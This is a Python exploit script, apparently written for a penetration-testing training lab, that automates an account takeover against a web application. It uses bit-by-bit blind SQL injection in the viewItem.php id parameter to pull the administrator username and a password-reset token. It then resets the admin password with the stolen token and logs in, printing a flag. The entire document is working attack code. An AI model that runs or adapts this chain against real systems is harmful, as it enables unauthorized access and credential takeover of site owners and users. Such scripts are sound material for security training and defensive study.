import requests
import argparse
import sys
import re

s = requests.session()
http_proxy = 'http://127.0.0.1:8080'
proxyDict = {
            "http" : http_proxy,
            "https" : http_proxy
}

def request_token(target, username):
    print("\n[+] Requesting password reset token...")
    url = "http://%s/login/resetPassword.php" %target
    data = {"username": "%s" %username}
    res = s.post(url, data=data, proxies=proxyDict)
    if "Success" in res.text:
        print("[*] Passsword reset token request succeeded")
    else:
        print("[-] Password reset token request failed :-(")
        sys.exit(-1)

def viewitems_sqli(target, inj_string):
    bit ="0"
    value = 1

    for j in reversed(range(8)):
        inj_strings = "%s>>%s)+=%s" %(inj_string,j, value)
        url = "http://%s/item/viewItem.php?id=%s" %(target, inj_strings)
        res = s.get(url, proxies=proxyDict, allow_redirects=False)

        if res.status_code == 404:
            bit=bit+str("1")
            value=int(bit,2)
        else:
            bit=bit[:-1]
            bit=bit+str("0")
            bit=bit+str("1")
            value=int(bit,2)
    return int(bit[:8],2)

def inject(inj, target, r):
    extracted = ""
    for i in range(1,r):
        inj_string = "1+AND+(ascii(substring((select+%s+from+user+WHERE+id_level+=1+LIMIT+1),%s,1))" %(inj,i)
        retrieved_value = viewitems_sqli(target, inj_string)

        if (retrieved_value):
            extracted += chr(retrieved_value)
            extracted_char = chr(retrieved_value)
            sys.stdout.write(extracted_char)
            sys.stdout.flush()
        else:
            break

    return extracted

def change_password(target, token, password):

    print("\n[+] Using token to change password...")
    url = "http://%s/login/doResetPassword.php?token=%s"%(target, token)
    res = s.get(url, proxies=proxyDict)
    if 'Success' in res.text:
        print("[*] Valid token supplied. Reseting password..")
    else:
        sys.exit(-1)
    url = "http://%s/login/doChangePassword.php" %target
    data = {"token": "%s" %token, "password": "%s" %password}
    s.post(url, data=data, proxies=proxyDict)

def login(target, username, password):

    print("[+] Logging in with new credentials "+username+"/"+password+"...")
    url = "http://%s/login/checkLogin.php" %target
    data = {"username": "%s" %username, "password": "%s" %password}
    res = s.post(url, data=data, proxies=proxyDict)
    flag = re.findall(r'\w+:\s\w+',res.text)
    print("[*] "+flag[0])

def main ():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--target', help='Target URL', required=True)
    parser.add_argument('-p','--password', help='Password to set', required=True)
    args = parser.parse_args()

    try:
        target = args.target
        password = args.password

    except IndexError:
            print("[-] Usage python3 %s -t <target IP> -p <Password to set>" % sys.argv[0])
            print("[-] eg: python3 %s -t 172.17.0.2 -p Offsec123" % sys.argv[0])
            sys.exit(-1)

    print("[+] Extrcting administrator Username via SQL Injection...")
    username = inject('username', target, 10)
    request_token(target, username)
    print("[+] Extracting token for "+username+" via SQL Injection...")
    token = inject('token', target, 16)
    change_password(target, token, password)
    login(target, username, password)

if __name__ == '__main__':

    main()
